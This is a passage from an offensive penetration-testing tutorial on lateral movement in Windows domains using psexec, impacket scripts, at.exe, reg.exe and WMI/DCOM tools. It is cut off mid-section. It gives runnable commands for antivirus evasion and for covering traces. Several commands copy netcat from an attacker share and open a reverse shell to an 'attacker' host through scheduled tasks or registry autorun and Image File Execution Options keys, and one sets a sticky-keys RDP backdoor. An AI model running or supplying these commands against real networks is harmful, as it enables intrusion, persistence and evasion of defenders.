# Lateral Movement

Penetration into the target network is just the first stage of a hacking attack. At the next stage, you have to establish a foothold there, steal users’ credentials, and gain the ability to run arbitrary code in the system. This article discusses techniques used to achieve the above goals and explains how to perform lateral movement in compromised networks.

After penetrating the external perimeter and getting into the internal corporate network, you have to expand your presence there. Surprisingly, but the larger is the internal corporate network, the easier can it be hacked. And vice versa, if the company is very small, its network may be extremely difficult to hack. Why is it so? The reason is simple: the larger is the network, the more vulnerable or misconfigured components it contains. In most cases, the compromise of a single node enables you to compromise multiple nodes adjacent to it at once.

Internal networks mostly consist of Windows servers and workstations. For attackers, this OS is of utmost interest because by default, it includes numerous interfaces for remote code execution. Furthermore, the attacker can extract user’s credentials from the system in multiple ways. Lateral movement between Linux servers is beyond the scope of this article: they are rarely included in domains and don’t offer such a broad range of default interfaces for remote administration. From the lateral movement perspective, a Linux PC is of interest only as a handy foothold.

Important: lateral movement involves 100% legitimate remote code execution. Accordingly, all techniques addressed in this article are based on the assumption that you have a valid account for a given PC. Furthermore, in many situation, an admin account is required.

When you perform lateral movement, your main priority is to attract as little attention from users and the security service as possible and avoid being detected by antivirus programs. The best way is to use the standard OS tools that are perfectly legitimate and indistinguishable from actions performed by network admins.

This article is not about numerous vulnerabilities plaguing Windows, or attacks on local networks, or privilege escalation in the Active Directory environment. It’s dedicated exclusively to legitimate aspects of a hacking attack: where to look for account credentials in Windows and what to do with them. The techniques addressed in it are not vulnerability exploits _per se_, but just tricks by design: if implemented properly, these procedures are perfectly legal.

The examples below are based on real situations you may encounter while exploring real-life internal networks. First, I am going to explain how to make your movement as quiet as possible and bypass antiviruses, and then I will separately address network ports required for that.

### Lateral movement strategy

Lateral movement combines two techniques:

* authenticated remote code execution; and&#x20;
* extraction of confidential information after gaining access.

Cyclical and sequential repetition of these steps sometimes allows to advance from a single compromised PC to the entire network infrastructure. Normally, lateral movement is performed to achieve one of the following goals:

* seize control over the domain controllers;
* reach to isolated critical network segments (e.g. the automatic process control system, SWIFT, etc.); or&#x20;
* search for critical information stored on a certain PC (confidential documents, billing data, etc.).

However, to achieve any of these goals, more and more credentials are required so that you can navigate through the network and gain access to more and more PCs. In most situations, to move freely through the internal network, you have to take over the domain controller: after doing so, you automatically gain access to nearly all nodes on the network. Speaking of [admins hunting](http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/), after reaching to the domain controller, it might seem that the search for privileged accounts is limited to blind guessing. But in fact, the Active Directory infrastructure and Windows itself disclose enough information to an ordinary domain user, so that you can identify the right movement direction and plan a sophisticated chain of hacks in the very beginning of lateral movement.

Sometimes, after taking over the domain controllers, you have to continue the movement to reach to a certain heavily guarded segment containing so-called ‘business risk’ objects. This might be a segment of the automatic process control system, interference into a technological process, access to a SWIFT segment (if you deal with a bank), access to the principal general’s computer, etc. In each case, you may encounter various lateral movement-related issues discussed below.

### Remote code execution in Windows

Below is an overview of tools that allow you to remotely execute arbitrary code on Windows systems using an existing account. Some of these programs support a handy interactive mode, while other just blindly run commands without displaying the result. This overview covers both handy and commonly used tools and less popular – but still capable to execute your code – ones.

Some of these utilities upload an executable service file to the target system to provide you with a handy interactive mode. But the problem is that such services are often blocked by antiviruses. The attacker’s IP can be blocked as well, which significantly slows down your movement. Furthermore, SOC becomes aware that somebody has penetrated into the network.

The lateral movement will mostly be performed using an amazing Python collection called [impacket](https://www.secureauth.com/labs/impacket/). To install it, run the command `pip install impacket`. After the installation, the required executable files will be stored in the folder `impacket/examples`; to find it, type: `pip show -f impacket`.

#### MSRPC

This is a DCERPC implementation by Microsoft. It expands open-source DCERPC by adding to it access over the SMB protocol via named pipes and primarily uses TCP port 445. The [auxiliary/scanner/smb/pipe\_auditor](https://www.offensive-security.com/metasploit-unleashed/scanner-smb-auxiliary-modules/) module will determine what named pipes are available over SMB.

**psexec.exe**

* **Source**: [sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)
* **AV risk**: no&#x20;
* **Used ports**: 135, 445, 4915x/TCP

Speaking of remote code execution on Windows, I cannot omit the well-known `psexec` utility created by Mark Russinovich. The program is equally popular among administrators and pentesters. It copies the executable file via the network resource `ADMIN$ (445/TCP)` and then remotely creates and launches a service for this executable file via `DCERPC (135,4915x/TCP)`. When the service is launched, you get a regular networking interaction with a remote command line:

`psexec.exe -u admin \\target cmd`

The main advantage of the program is that the server component, `psexecsvc.exe`, is signed by the Sysinternals certificate belonging to Microsoft (i.e. the software is 100% legitimate). Another advantage of the classical `psexec.exe` is the ability to execute code in specified user sessions:

`psexec.exe -u admin -i 2 \\target shutdown /l`

**psexec.py**

* **Source**: impacket Python collection
* **AV risk**: yes
* **Used ports**: 445/TCP

A great alternative for Linux users. However, this tool will most probably alert the antiviruses. As said above, this is because of the service copied to the remote host. The problem can be fixed by specifying an arbitrary command in the implementation of the `createService()` method in `/usr/local/lib/python3.7/dist-packages/impacket/examples/serviceinstall.py`; this command will be executed instead of the launched remote admin service.

![Arbitrary command conceals the launch of the remote admin service](https://st768.s3.eu-central-1.amazonaws.com/ee4a8d5e4108d764d303f0929e282db7/16354/image1.png)

Arbitrary command conceals the launch of the remote admin service

To prevent `psexec.py` from copying the suspicious component, you forcefully specify the file that must be used as a service. Because you have already written the command manually, this file can be anything.

`psexec.py -file somefile.txt admin@target`

As you can see, the `mkdir c:\pwn` command has been executed, which won’t ring the alarm bells for antiviruses. However, this `psexec` modification lacks the usability present in its initial version.

**winexe**

* **Source**: [winexe](https://sourceforge.net/projects/winexe/)
* **AV risk**: yes
* **Used ports**: 445/TCP

An older native analogue of `psexec` for Linux. Similar to `psexec`, opens a remote interactive command line:

`winexe -U admin //target cmd`

The utility is similar to other such tools, but it’s more rarely detected by antiviruses. Of course, `winexe` isn’t 100% secure, but it can be used if, for some reason, `psexec.py` doesn’t work.

**smbexec.py**

* **Source**: impacket Python collection / built-in Windows component
* **AV risk**: yes
* **Used ports**: 445/TCP

A simplified version of `psexec`; it also creates a service, but uses for this purpose only MSRPC, and the service is controlled via the `svcctl` SMB pipe:

`smbexec.py -mode SHARE admin@target`

As a result, you gain access to an interactive command line.

**services.py**

* **Source**: impacket Python collection
* **AV risk**: no&#x20;
* **Used ports**: 445/TCP

An even simpler version of `psexec`. You have to manually perform operations that `psexec` performs automatically. To view the list of services, type:

`services.py admin@target list`

Then create a new service and specify an arbitrary command:

`services.py admin@target create -name 1 -display 1 -path 'cmd arg1 arg2'`

Next, run the newly-created service:

`services.py admin@target start -name 1`

And finally, cover-up the traces and delete the service.

`services.py admin@target delete -name 1`

This remote command execution technique is noninteractive – you cannot see results of your actions. But it’s 100% secure and I used it many times in situations when antiviruses installed on the remote host have killed all my hacking tools.

**atexec.py/at.exe**

* **Source**: impacket Python collection / built-in Windows component
* **AV risk**: no&#x20;
* **Used ports**: 445/TCP

This a Windows Task Scheduler service available via the `atsvc` SMB pipe. It allows you to remotely add to the scheduler a task that will be executed at the specified time.

`At.exe` is another noninteractive RCE technique. When you use it, the following commands are executed blindly:

`at.exe \\target 13:37 "cmd /c copy \\attacker\a\nc.exe && nc -e \windows\system32\cmd.exe attacker 8888"`

By contrast, `atexec.py`, allows you to see the output of the executed command:

`atexec.py admin@target ipconfig`

The only difference is that the command output is sent to a file and read using `ADMIN$`. To use this tool, you must ensure that the clocks on the attacking PC and on the target PC are synchronized to the exact minute.

**reg.exe**

* **Source**: Windows component
* **AV risk**: no&#x20;
* **Used ports**: 445/TCP

Remote access to the registry with writing permissions effectively grants you the RCE capacity. The utility uses the `winreg` SMB pipe. By default, the remote registry service is running only on server operating systems (Windows 2003-2019). Below is a popular trick involving the startup (delayed RCE):

`reg.exe add \\target\HKLM\software\microsoft\windows\currentversion\run /v testprog /t REG_SZ /d "cmd /c copy \\attacker\a\nc.exe && nc -e \windows\system32\cmd.exe attacker 8888"`

The trick uses the program launch handler. If this program is frequently run on the target PC, you will get RCE almost instantly:

`reg.exe add "\\target\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe" /v Debugger /t reg_sz /d "cmd /c copy \\attacker\a\nc.exe && nc -e \windows\system32\cmd.exe attacker 8888"`

My favorite trick involving a backdoor in RDP:

`reg.exe add "\\target\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t reg_sz /d "\windows\system32\cmd.exe"`

#### DCERPC

DCERPC uses ports 135/TCP and 4915x/TCP (4915x are dynamically assigned ports). In some cases, ports from other ranges can be used as well.

In many companies, network admins and security specialists – who are aware of the most common attack vectors – simply block port 445/TCP as a mitigation, thus, making `psexec` and many other techniques unusable. However, as said above, Windows offers multiple ways for remote code execution, and DCERPC provides an alternative (in some situations, it even opens access to the same RPC interfaces). In fact, you use not DCERPC itself, but other tools based on its technology (e.g. WMI).

**wmiexec.py**

* **Source**: impacket Python collection
* **AV risk:** yes
* **Used ports:** 135, (445), 4915x/TCP

The `wmiexec.py` script allows you to execute code in the interactive mode:

`wmiexec.py admin@target`

Even though `wmiexec.py` doesn’t run any third-party executable files on the remote host, antiviruses sometimes detect it. In addition, `wmiexec.py` retrieves results from the `ADMIN$` share (i.e. uses port 445/TCP). Therefore, blind RCE is a more secure variant:

`wmiexec.py -nooutput admin@target "mkdir c:\pwn"`

**dcomexec.py**

* **Source**: impacket Python collection
* **AV risk:** no&#x20;
* **Used ports:** 135, (445), 4915x/TCP

This tool is similar to `wmiexec.py`. By default, it’s interactive and retrieves results from `ADMIN$` via port 445/TCP:

`dcomexec.py admin@target`

To avoid the need to use port 445/TCP, you may execute your code blindly:

`dcomexec.py -nooutput admin@10.0.0.64 "mkdir c:\123"`

**wmis**

* **Origin:** wmi-client and wmis packages
* **AV risk:** yes
* **Used ports:** 135, 4915x/TCP

The `wmis` utility is present in two packages of the same name. To run it, use the following command:

`wmis -U admin //target "mkdir c:\pwn"`

There are no principal differences between the two v
